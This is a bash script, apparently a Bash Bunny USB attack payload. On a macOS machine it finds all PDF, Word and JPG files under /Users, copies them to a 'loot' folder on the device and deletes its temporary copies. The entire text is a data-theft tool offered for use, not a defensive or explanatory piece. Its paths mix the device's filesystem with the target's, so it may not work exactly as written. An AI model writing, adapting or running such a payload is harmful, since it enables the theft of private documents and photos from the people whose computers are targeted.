#!/bin/bash

# Set target file types
TARGET_FILE_TYPES=("*.pdf" "*.docx" "*.jpg")

# Set the loot folder on the Bash Bunny
LOOT_DIR="/root/udisk/loot/ExfiltratedFiles"

# Set the temporary folder on the target system
TEMP_DIR="/tmp/bashbunny"

# Create the loot and temp directories
mkdir -p "$LOOT_DIR"
mkdir -p "$TEMP_DIR"

# Create a payload function for macOS
function payload_macOS() {
  # Search for and copy the target file types to the temporary directory
  for file_type in "${TARGET_FILE_TYPES[@]}"; do
    find /Users -type f -iname "$file_type" -exec cp {} "$TEMP_DIR" \;
  done

  # Copy the collected files from the temporary directory to the Bash Bunny
  cp -R "$TEMP_DIR"/* "$LOOT_DIR"

  # Clean up the temporary directory
  rm -rf "$TEMP_DIR"
}

# Identify the target OS
TARGET_OS=$(uname)

# Execute the payload based on the target OS
case "$TARGET_OS" in
  Darwin)
    payload_macOS
    ;;
  *)
    echo "Unsupported operating system."
    ;;
esac
